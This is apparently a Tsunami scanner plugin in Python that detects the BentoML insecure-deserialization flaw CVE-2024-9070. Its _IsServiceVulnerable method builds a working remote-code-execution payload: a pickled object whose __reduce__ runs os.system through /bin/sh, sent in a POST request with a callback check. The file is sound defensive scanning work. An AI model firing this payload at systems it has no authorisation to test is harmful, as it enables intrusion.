# Copyright 2024 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""A Tsunami plugin for detecting CVE-2024-9070."""
from absl import logging
from common.data import network_endpoint_utils
from common.data import network_service_utils
from common.net.http.http_client import HttpClient
from common.net.http.http_headers import HttpHeaders
from common.net.http.http_request import HttpRequest
from google.protobuf import timestamp_pb2
from plugin.payload.payload_generator import PayloadGenerator
import detection_pb2
import payload_generator_pb2 as pg
import pickle
import plugin_representation_pb2
import time
import tsunami_plugin
import vulnerability_pb2

_VULN_DESCRIPTION = (
    'The BentoML framework is vulnerable to an insecure deserialization issue that can'
    ' be exploited by sending a single POST request to any valid endpoint of the runner server.'
    'The impact of this is remote code execution.'
)
_SLEEP_TIME_SEC = 20


class Cve20249070Detector(tsunami_plugin.VulnDetector):
    """A TsunamiPlugin that detects RCE on the BentoML target."""

    def __init__(
            self, http_client: HttpClient, payload_generator: PayloadGenerator
    ):
        self.http_client = http_client
        self.payload_generator = payload_generator

    def GetPluginDefinition(self) -> tsunami_plugin.PluginDefinition:
        """Defines the PluginDefinition for Cve20249070Detector.

    Returns:
      The PluginDefinition used for the Tsunami engine to identify this plugin.
    """
        return tsunami_plugin.PluginDefinition(
            info=plugin_representation_pb2.PluginInfo(
                type=plugin_representation_pb2.PluginInfo.VULN_DETECTION,
                name='Cve20249070VulnDetector',
                version='1.0',
                description=_VULN_DESCRIPTION,
                author='VickyTheViking',
            )
        )

    def Detect(
            self,
            target: tsunami_plugin.TargetInfo,
            matched_services: list[tsunami_plugin.NetworkService],
    ) -> tsunami_plugin.DetectionReportList:
        """Run detection logic for the BentoML target.

    Args:
      target: TargetInfo about BentoML Insecure Deserialization.
      matched_services: A list of network services whose vulnerabilities could
        be detected by this plugin. "ppp" for example would be on this list.

    Returns:
      A tsunami_plugin.DetectionReportList for all the vulnerabilities of the
      scanning target.
    """
        logging.info('Cve20249070Detector starts detecting.')
        vulnerable_services = [
            service for service in matched_services if
            self._IsSupportedService(service) and self._IsBentoMlWebService(service)
        ]

        return detection_pb2.DetectionReportList(
            detection_reports=[
                self._BuildDetectionReport(target, service)
                for service in vulnerable_services
                if self._IsServiceVulnerable(service)
            ]
        )

    def _IsSupportedService(
            self, network_service: tsunami_plugin.NetworkService
    ) -> bool:
        """Check if network service is a web service or an unknown service."""
        return (
                not network_service.service_name
                or network_service_utils.is_web_service(network_service)
                or network_service_utils.get_service_name(network_service) == 'unknown'
                or network_service_utils.get_service_name(network_service) == 'ppp'
        )

    def _IsBentoMlWebService(
            self, network_service: tsunami_plugin.NetworkService
    ) -> bool:
        """Check if this web service is a BentoML web application."""
        url = self._BuildUrl(network_service, "/")
        request = (
            HttpRequest.get(url)
            .with_empty_headers()
            .build()
        )
        try:
            response = self.http_client.send(request, network_service)
            return "Method Not Allowed" in response.body_string()
        except Exception:  # pylint: disable=broad-exception-caught
            logging.exception('Unable to query %s', url)
        return False

    def _IsServiceVulnerable(
            self, network_service: tsunami_plugin.NetworkService
    ) -> bool:
        """Check if network service may result in RCE."""

        config = pg.PayloadGeneratorConfig(
            vulnerability_type=pg.PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE,
            interpretation_environment=pg.PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL,
            execution_environment=pg.PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT,
        )
        payload = self.payload_generator.generate(config)
        if not payload.get_payload_attributes().uses_callback_server:
            return False

        class Payload(object):
            def __reduce__(self):
                import os
                return os.system, (f'/bin/sh -c "{payload.get_payload()}"',)

        rce_command = pickle.dumps(Payload())
        url = self._BuildUrl(network_service, "/")
        request = (
            HttpRequest.builder().set_method("POST").set_url(url)
            .set_headers(
                HttpHeaders.builder()
                .add_header("Content-Type", "application/vnd.bentoml.pickled")
                .add_header("args-number", "3")
                .build()
            )
            .set_request_body(rce_command)
            .build()
        )
        try:
            self.http_client.send(request, network_service)
        except TimeoutError:  # pylint: disable=broad-exception-caught
            # timeout is expected here because server won't return anything
            pass
        except Exception:  # pylint: disable=broad-exception-caught
            logging.exception('Unable to query %s', url)

        time.sleep(_SLEEP_TIME_SEC)
        return payload.check_if_executed()

    def _BuildUrl(self, network_service: tsunami_plugin.NetworkService, vulnerable_path) -> str:
        """Build the vulnerable target path for RCE injection."""
        if network_service_utils.is_web_service(network_service):
            url = network_service_utils.build_web_application_root_url(
                network_service
            )
        else:
            url = 'http://{}/'.format(
                network_endpoint_utils.to_uri_authority(
                    network_service.network_endpoint
                ).strip("/")
            )
        return url + vulnerable_path.strip("/")

    def _BuildDetectionReport(
            self,
            target: tsunami_plugin.TargetInfo,
            vulnerable_service: tsunami_plugin.NetworkService,
    ) -> detection_pb2.DetectionReport:
        """Generate the detection report for all vulnerability findings."""
        return detection_pb2.DetectionReport(
            target_info=target,
            network_service=vulnerable_service,
            detection_timestamp=timestamp_pb2.Timestamp().GetCurrentTime(),
            detection_status=detection_pb2.DetectionStatus.VULNERABILITY_VERIFIED,
            vulnerability=vulnerability_pb2.Vulnerability(
                main_id=vulnerability_pb2.VulnerabilityId(
                    publisher='TSUNAMI_COMMUNITY', value='CVE_2024_9070'
                ),
                severity=vulnerability_pb2.Severity.CRITICAL,
                title=(
                    'BentoML Insecure Deserialization RCE (CVE-2024-9070) for Runner Server'
                ),
                recommendation=(
                    'Users should not expose the bentoml Runner Server endpoints to untrusted environments.'
                ),
                description=_VULN_DESCRIPTION,
            ),
        )
